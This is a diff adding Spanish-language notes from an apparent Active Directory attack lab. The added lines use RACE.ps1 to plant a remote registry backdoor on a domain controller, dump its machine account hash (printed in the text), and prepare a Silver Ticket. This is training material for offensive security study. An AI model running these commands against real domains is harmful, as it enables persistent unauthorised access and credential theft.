@@ -1076,4 +1076,34 @@ Set-RemotePSRemoting -SamAccountName student97 -ComputerName dcorp-dc.dollarcorp
 ```
 Suele mostrar un error que podemos ignorar
 
-Ahora ya podemos ejecutar comandos usando el 
+Ahora ya podemos ejecutar comandos usando el control remoto de *PowerShell*
+```shell
+Invoke-Command -ScriptBlock{$env:username} -ComputerName dcorp-dc.dollarcorp.moneycorp.local
+```
+
+Volvemos a cargar, para recuperar el hash de la cuenta de *Domain Admin*
+```shell
+[student97]
+. C:\AD\Tools\RACE.ps1
+```
+
+```shell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
+```
+
+Pudiendo ahora recupar el hash del *dcorp-dc* siendo el *student97*
+```shell
+[student97]
+. C:\AD\Tools\RACE.ps1
+```
+
+```shell
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
+
+```ad-hint
+dcorp-dc     92163c923f1589e39f0f8c6a369eebaf
+```
+
+Ese hash lo podemos usar para crear un *Silver Ticket* para poder ejecutar consultas *WMI*
+
